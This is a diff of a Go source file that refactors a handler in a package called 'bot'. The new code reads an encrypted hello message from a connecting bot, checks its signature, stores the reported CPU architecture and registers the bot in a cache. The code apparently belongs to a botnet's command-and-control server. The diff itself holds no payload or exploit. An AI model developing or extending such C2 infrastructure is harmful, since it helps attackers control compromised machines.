@@ -3,23 +3,17 @@ package bot
 import (
 	"bytes"
 	"fmt"
-	"net"
 	"strings"
+	"time"
 )
 
-func (h *Handler) RunConnHandler(conn net.Conn) {
-	defer conn.Close()
-	defer fmt.Println("bye")
+func (h *Handler) botHello() {
 
-	// disconnect bot if already connected
-	if h.services.BotCache.Has(h.bot.Ip) {
-		return
-	}
+	h.bot.Conn.SetDeadline(time.Now().Add(5 * time.Second))
 
-	// get hello msg
 	var b = make([]byte, 1024)
 
-	n, err := conn.Read(b)
+	n, err := h.bot.Conn.Read(b)
 	if err != nil {
 		fmt.Printf("[BOT] %s Error: %v ", h.bot.Ip, err)
 		return
@@ -37,35 +31,37 @@ func (h *Handler) RunConnHandler(conn net.Conn) {
 	d := h.services.Encrypter.Decrypt(string(b[:n]), key)
 
 	msgDecrypted := strings.Split(d, "|")
+	if len(msgDecrypted) != 2 {
+		fmt.Println("[BOT] Error: Invalid decrypted msg")
+		return
+	}
 
 	if msgDecrypted[0] != HELLO_SIGNATURE {
 		fmt.Println("[BOT] Error: Invalid sign")
+		return
 	}
+
+	h.bot.Arch = msgDecrypted[1]
 
 	fmt.Println("ARCH", msgDecrypted[1])
 
-	h.services.BotCache.Set(h.bot.Ip, h.bot)
-	defer h.services.BotCache.Delete(h.bot.Ip)
+	// disconnect bot if already connected
+	// h.services.BotCache.Range(func(_, value any) bool {
+	// 	v, err := domain.SafeCast[domain.Bot](value)
+	// 	if err != nil {
+	// 		panic(err)
+	// 	}
 
-	for {
-		var b = make([]byte, 1024)
+	// 	if v.Ip == h.bot.Ip {
+	// 		h.Disconnect()
+	// 		return false
+	// 	}
+	// 	return true
+	// })
 
-		n, err := conn.Read(b)
-		if err != nil {
-			if err.Error() == "EOF" {
-				return
-			}
-		}
+	h.bot.Conn.SetDeadline(time.Time{})
 
-		fmt.Println(string(b[:n]))
-		fmt.Println(b[:n])
-
-		fmt.Println("write")
-
-		fmt.Println(b[:n])
-
-		// h.services.Parser.Parse()
-	}
+	h.services.BotCache.Set(h.bot.Addr, h.bot)
 }
 
 func (h *Handler) print() {
